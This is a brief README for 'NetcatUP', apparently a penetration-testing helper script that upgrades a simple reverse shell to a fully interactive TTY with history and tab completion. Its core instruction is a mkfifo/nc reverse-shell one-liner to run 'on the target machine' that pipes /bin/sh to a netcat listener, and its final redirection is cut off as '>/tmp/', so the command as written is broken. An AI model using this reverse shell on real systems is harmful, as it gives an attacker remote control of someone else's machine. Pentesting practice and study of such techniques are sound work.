# NetcatUP


run `./netcatup.sh port`  
run `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 5555 >/tmp/` on the target machine
You should now have a fully interactive shell with bash history and tab completion  

credits: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

